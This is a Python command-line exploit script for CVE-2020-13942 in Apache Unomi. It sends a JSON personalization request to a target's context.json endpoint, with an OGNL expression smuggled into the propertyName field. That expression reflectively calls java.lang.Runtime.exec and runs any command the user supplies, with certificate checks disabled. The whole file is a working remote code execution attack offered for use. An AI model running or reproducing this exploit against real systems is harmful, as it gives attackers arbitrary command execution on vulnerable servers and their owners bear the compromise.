#coding=utf-8

import requests
import sys
import json
import os
import click

requests.packages.urllib3.disable_warnings()

# 命令执行
def exp(url,payload):
    header = {
        "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4 Supplemental Update) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    }
    data = {
        "personalizations" : [
            {
                "id" : "gender-test",
                "strategy" : "matching-first",
                "strategyOptions" : {
                    "fallback" : "var2"
                },
                "contents" : [
                    {
                        "filters" : [
                            {
                                "condition" : {
                                    "parameterValues":{
                                        "propertyName" : payload,
                                        "comparisonOperator" : "equals",
                                        "propertyValue" : "male"
                                    },
                                    "type" : "profilePropertyCondition"
                                }
                            }
                        ]
                    }
                ]
            }
        ],
        "sessionId" : "sample"
    }
    req = requests.post(headers = header, url = url, data = json.dumps(data), timeout = 5, verify = False)
    print(req.text)


@click.command()
@click.option("--url", help='Target URL; Example:http://ip:port。', type=str)
@click.option("--cmd", help="Commands to be executed; ", type=str)
def main(url,cmd):
    ppp = '''
    =====================================================================
    =   [+] CVE-2020-13942 Apache Unomi                                 =
    =   [+] Explain: YaunSky   Time: 2020-12                            =
    =   [+] python3 UnomiExp.py --url http://127.0.0.1/ --cmd "command" =
    =====================================================================
'''
    print(ppp)
    if url != None and cmd != None:
        url = str(url) + "context.json"
        cmd = '"' + str(cmd) + '"'
        payload = '(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,' + cmd + '))'
        try:
            exp(url,payload)
        except:
           print("【-】请确定漏洞是否真实存在")


if __name__ == "__main__":
    main()